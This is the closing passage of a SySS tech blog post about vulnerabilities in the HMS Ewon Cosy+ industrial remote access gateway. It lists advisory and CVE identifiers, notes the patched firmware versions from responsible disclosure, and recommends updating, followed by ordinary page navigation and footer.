      <td><a href="https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-032.txt">SYSS-2024-032</a></td>
      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-33895">CVE-2024-33895</a></td>
    </tr>
    <tr>
      <td>Execution with Unnecessary Privileges (CWE-250)</td>
      <td><a href="https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-033.txt">SYSS-2024-033</a></td>
      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-33894">CVE-2024-33894</a></td>
    </tr>
    <tr>
      <td>Improper Authentication (CWE-287)</td>
      <td><a href="https://www.syss.de/fileadmin/dokumente/Publikationen/Advisories/SYSS-2024-043.txt">SYSS-2024-043</a></td>
      <td><a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-33897">CVE-2024-33897</a></td>
    </tr>
  </tbody>
</table></div>

<p>As a result of our responsible disclosure of these security issues, the manufacturer provided the patched firmware versions <code class="language-plaintext highlighter-rouge">21.2s10</code> and <code class="language-plaintext highlighter-rouge">22.1s3</code>.
We recommend updating <a href="https://www.hms-networks.com/p/ec71330-00ma-ewon-cosy-ethernet">Cosy+</a> devices according to the <a href="https://hmsnetworks.blob.core.windows.net/nlw/docs/default-source/products/cybersecurity/security-advisory/hms-security-advisory-2024-07-29-001--ewon-several-cosy--vulnerabilities.pdf">manufacturer note</a> as soon as possible.</p>

<p>The improper authentication for certificate signing was fixed by the manufacturer immediately after we reported the issue.</p>

<p>We would like to point out that the cooperation with the manufacturer HMS during the responsible disclosure process was excellent and exemplary.</p>



      </div>

      <div class="post-tail-wrapper text-muted">

        <!-- categories -->
        
        <div class="post-meta mb-3">
          <i class="far fa-folder-open fa-fw mr-1"></i>
          
            <a href='/categories/exploit/'>exploit</a>,
            <a href='/categories/research/'>research</a>,
            <a href='/categories/advisory/'>advisory</a>
        </div>
        

        <!-- tags -->
        
        <div class="post-tags">
          <i class="fa fa-tags fa-fw mr-1"></i>
          
          <a href="/tags/news/"
            class="post-tag no-text-decoration" >news</a>
          
          <a href="/tags/exploit/"
            class="post-tag no-text-decoration" >exploit</a>
          
          <a href="/tags/syss-2024-016/"
            class="post-tag no-text-decoration" >syss-2024-016</a>
          
          <a href="/tags/syss-2024-017/"
            class="post-tag no-text-decoration" >syss-2024-017</a>
          
          <a href="/tags/syss-2024-018/"
            class="post-tag no-text-decoration" >syss-2024-018</a>
          
          <a href="/tags/syss-2024-032/"
            class="post-tag no-text-decoration" >syss-2024-032</a>
          
          <a href="/tags/syss-2024-033/"
            class="post-tag no-text-decoration" >syss-2024-033</a>
          
          <a href="/tags/syss-2024-043/"
            class="post-tag no-text-decoration" >syss-2024-043</a>
          
          </div>
        

        <div class="post-tail-bottom
          d-flex justify-content-between align-items-center mt-3 pt-5 pb-2">
          
          <div class="license-wrapper">
            This post is licensed under
            <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a>
            by the author.
          </div>
          

          <!--
 Post sharing snippet
-->

<div class="share-wrapper">
  <span class="share-label text-muted mr-1">Share</span>
  <span class="share-icons">
    
    

    
      
        <a href="https://twitter.com/intent/tweet?text=Hacking a Secure Industrial Remote Access Gateway - SySS Tech Blog&url=https://blog.syss.com/posts/hacking-a-secure-industrial-remote-access-gateway/" data-toggle="tooltip" data-placement="top"
          title="Twitter" target="_blank" rel="noopener" aria-label="Twitter">
          <i class="fa-fw fab fa-twitter"></i>
        </a>
    
      
        <a href="https://www.facebook.com/sharer/sharer.php?title=Hacking a Secure Industrial Remote Access Gateway - SySS Tech Blog&u=https://blog.syss.com/posts/hacking-a-secure-industrial-remote-access-gateway/" data-toggle="tooltip" data-placement="top"
          title="Facebook" target="_blank" rel="noopener" aria-label="Facebook">
          <i class="fa-fw fab fa-facebook-square"></i>
        </a>
    
      
        <a href="https://telegram.me/share?text=Hacking a Secure Industrial Remote Access Gateway - SySS Tech Blog&url=https://blog.syss.com/posts/hacking-a-secure-industrial-remote-access-gateway/" data-toggle="tooltip" data-placement="top"
          title="Telegram" target="_blank" rel="noopener" aria-label="Telegram">
          <i class="fa-fw fab fa-telegram"></i>
        </a>
    

    <i class="fa-fw fas fa-link small" onclick="copyLink()"
        data-toggle="tooltip" data-placement="top" title="Copy link"></i>

  </span>
</div>


        </div><!-- .post-tail-bottom -->

      </div><!-- div.post-tail -->

    </div> <!-- .post -->


  </div> <!-- #post-wrapper -->

  

  

  <!--
  The Pannel on right side (Desktop views)
-->

<div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down">

  <div class="access">

  














  

    <div id="access-lastmod" class="post">
      <span>Recent Update</span>
      <ul class="post-content pl-0 pb-1 ml-1 mt-2">

      
        
        
        
        <li><a href="/posts/voip-deskphone-firmware-security/">Firmware Security: Alcatel-Lucent ALE-DeskPhone</a></li>
      
        
        
        
        <li><a href="/posts/introducing-MAT/">Introducing M.A.T</a></li>
      
        
        
        
        <li><a href="/posts/introducing-azurenum/">Introducing AzurEnum</a></li>
      
        
        
        
        <li><a href="/posts/zero-touch-pwn/">Zero Touch Pwn: Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones</a></li>
      
        
        
        
        <li><a href="/posts/malware-analysis-NetSupport-RAT/">NetSupport RAT distributed via fake invoices</a></li>
      

      </ul>
    </div> <!-- #access-lastmod -->

  

  















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



  
    <div id="access-tags">
      <span>Trending Tags</span>
      <div class="d-flex flex-wrap mt-3 mb-1 mr-3">

      
        
        <a class="post-tag" href="/tags/news/">news</a>
      
        
        <a class="post-tag" href="/tags/paper/">paper</a>
      
        
        <a class="post-tag" href="/tags/advisory/">advisory</a>
      
        
        <a class="post-tag" href="/tags/exploit/">exploit</a>
      
        
        <a class="post-tag" href="/tags/cve/">cve</a>
      
        
        <a class="post-tag" href="/tags/video/">video</a>
      
        
        <a class="post-tag" href="/tags/analysis/">analysis</a>
      
        
        <a class="post-tag" href="/tags/cve-2021-32033/">cve-2021-32033</a>
      
        
        <a class="post-tag" href="/tags/cve-2022-28382/">cve-2022-28382</a>
      
        
        <a class="post-tag" href="/tags/cve-2022-28383/">cve-2022-28383</a>
      

      </div>
    </div>
  
  </div> <!-- .access -->

  
    <!-- BS-toc.js will be loaded at medium priority -->
    <script src="/assets/js/lib/bootstrap-toc.min.js"></script>
    <div id="toc-wrapper" class="pl-0 pr-4 mb-5">
      <span class="pl-3 pt-2 mb-2">Contents</span>
      <nav id="toc" data-toggle="toc"></nav>
    </div>
  

</div> <!-- #panel-wrapper -->


</div> <!-- .row -->

<div class="row">
  <div class="col-12 col-lg-11 col-xl-8">
    <div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

    <!--
 Recommend the other 3 posts according to the tags and categories of the current post,
 if the number is not enough, use the other latest posts to supplement.
-->

<!-- The total size of related posts  -->


<!-- An random integer that bigger than 0  -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy}  -->








  

  
    
  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  


  

  

  

  

  

  








<!-- Fill with the other newlest posts  -->






  <div id="related-posts" class="mt-5 mb-2 mb-sm-4">
    <h3 class="pt-2 mt-1 mb-4 ml-1"
      data-toc-skip>Further Reading</h3>
    <div class="card-deck mb-4">
    
      
      
      <div class="card">
        <a href="/posts/voip-deskphone-firmware-security/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Jul 12
  

  <i class="unloaded">2024-07-12T05:00:00+02:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Firmware Security: Alcatel-Lucent ALE-DeskPhone</h3>
            <div class="text-muted small">
              <p>
                





                This blog post is about an analysis of firmware security in a VoIP deskphone.
This analysis ties in with our previous research and the demonstrated exploitation of zero touch deployments (see Zero ...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/abusing-ms-teams-direct-routing/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Sep  1, 2022
  

  <i class="unloaded">2022-09-01T10:00:00+02:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Abusing Microsoft Teams Direct Routing</h3>
            <div class="text-muted small">
              <p>
                





                In this blog post, a practical problem and security issue when it comes to phone integration with Microsoft Teams Direct Routing is described.

Due to a lack of authentication methods provided by M...
              </p>
            </div>
          </div>
        </a>
      </div>
    
      
      
      <div class="card">
        <a href="/posts/zero-touch-pwn/">
          <div class="card-body">
            <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->





<span class="timeago small"
  

  
   >

  
  

  
    Aug 11, 2023
  

  <i class="unloaded">2023-08-11T09:00:00+02:00</i>

</span>

            <h3 class="pt-0 mt-1 mb-3" data-toc-skip>Zero Touch Pwn: Abusing Zoom's Zero Touch Provisioning for Remote Attacks on Desk Phones</h3>
            <div class="text-muted small">
              <p>
                





                In this blog post, we describe several vulnerabilities that were discovered during a security analysis of AudioCodes desk phones and Zoom’s Zero Touch Provisioning. 
We also discuss and demonstrate...
              </p>
            </div>
          </div>
        </a>
      </div>
    
    </div> <!-- .card-deck -->
  </div> <!-- #related-posts -->



    <!--
  Navigation buttons at the bottom of the post.
-->

<div class="post-navigation d-flex justify-content-between">
  
  <a href="/posts/voip-deskphone-firmware-security/" class="btn btn-outline-primary"
    prompt="Older">
    <p>Firmware Security: Alcatel-Lucent ALE-DeskPhone</p>
  </a>
  

  
  <span class="btn btn-outline-primary disabled"
    prompt="Newer">
    <p>-</p>
  </span>
  

</div>


    

    </div> <!-- #post-extend-wrapper -->

  </div> <!-- .col-* -->

</div> <!-- .row -->



        <!--
  The Footer
-->

<footer class="d-flex w-100 justify-content-center">
  <div class="d-flex justify-content-between align-items-center">
    <div class="footer-left">
      <p class="mb-0">
        © 2024
        <a href="https://www.syss.de">SySS GmbH</a>.
        
        <span data-toggle="tooltip" data-placement="top"
          title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span>
        
      </p>
    </div>

    <div class="footer-right">
      <p class="mb-0">
        Powered by
        <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a>
        with modified
        <a href="https://github.com/cotes2020/jekyll-theme-chirpy"
          target="_blank" rel="noopener">Chirpy</a>
        theme.
      </p>
    </div>

  </div> <!-- div.d-flex -->
</footer>


      </div>

      <!--
  The Search results
-->
<div id="search-result-wrapper" class="d-flex justify-content-center unloaded">
  <div class="col-12 col-sm-11 post-content">
    <div id="search-hints">
      <h4 class="text-muted mb-4">Trending Tags</h4>

      















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
      
        
        



      
        
        <a class="post-tag" href="/tags/news/">news</a>
      
        
        <a class="post-tag" href="/tags/paper/">paper</a>
      
        
        <a class="post-tag" href="/tags/advisory/">advisory</a>
      
        
        <a class="post-tag" href="/tags/exploit/">exploit</a>
      
        
        <a class="post-tag" href="/tags/cve/">cve</a>
      
        
        <a class="post-tag" href="/tags/video/">video</a>
      
        
        <a class="post-tag" href="/tags/analysis/">analysis</a>
      
        
        <a class="post-tag" href="/tags/cve-2021-32033/">cve 2021 32033</a>
      
        
        <a class="post-tag" href="/tags/cve-2022-28382/">cve 2022 28382</a>
      
        
        <a class="post-tag" href="/tags/cve-2022-28383/">cve 2022 28383</a>
      

    </div>
    <div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div>
  </div>
</div>


    </div> <!-- #main-wrapper -->

    

    <div id="mask"></div>

    <a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button">
      <i class="fas fa-angle-up"></i>
    </a>

    <!--
  Jekyll Simple Search loader
  See: <https://github.com/christian-fei/Simple-Jekyll-Search>
-->





<script src="/assets/js/lib/simple-jekyll-search.min.js"></script>

<script>
SimpleJekyllSearch({
  searchInput: document.getElementById('search-input'),
  resultsContainer: document.getElementById('search-results'),
  json: '/assets/js/data/search.json',
  searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0">  <a href="https://blog.syss.com{url}">{title}</a>  <div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1">    {categories}    {tags}  </div>  <p>{snippet}</p></div>',
  noResultsText: '<p class="mt-5">Oops! No result founds.</p>',
  templateMiddleware: function(prop, value, template) {
    if (prop === 'categories') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`;
      }
    }

    if (prop === 'tags') {
      if (value === '') {
        return `${value}`;
      } else {
        return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`;
      }
    }
  }
});
</script>


  </body>

</html>

